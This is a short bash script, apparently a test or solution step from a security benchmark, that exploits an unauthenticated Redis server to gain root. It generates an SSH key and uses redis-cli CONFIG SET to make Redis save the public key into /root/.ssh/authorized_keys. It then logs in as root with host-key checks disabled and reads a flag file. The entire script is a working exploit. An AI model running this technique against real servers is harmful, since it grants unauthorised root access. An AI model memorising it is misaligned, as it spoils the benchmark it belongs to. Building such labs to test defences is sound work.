#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run "
KEY=/tmp/bench_redis_key
rm -f \"\$KEY\" \"\$KEY.pub\"
ssh-keygen -t ed25519 -N \"\" -f \"\$KEY\" -q
PUB=\$(cat \"\$KEY.pub\")
redis-cli -h 127.0.0.1 CONFIG SET dir /root/.ssh >/dev/null
redis-cli -h 127.0.0.1 CONFIG SET dbfilename authorized_keys >/dev/null
redis-cli -h 127.0.0.1 SET p \"\$(printf \"\\n\\n%s\\n\\n\" \"\$PUB\")\" >/dev/null
redis-cli -h 127.0.0.1 SAVE >/dev/null
sleep 1
ssh -i \"\$KEY\" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PasswordAuthentication=no -p ${BENCH_PORT} root@127.0.0.1 \"cat /root/flag.txt\"
")"
assert_root_output "${out}"
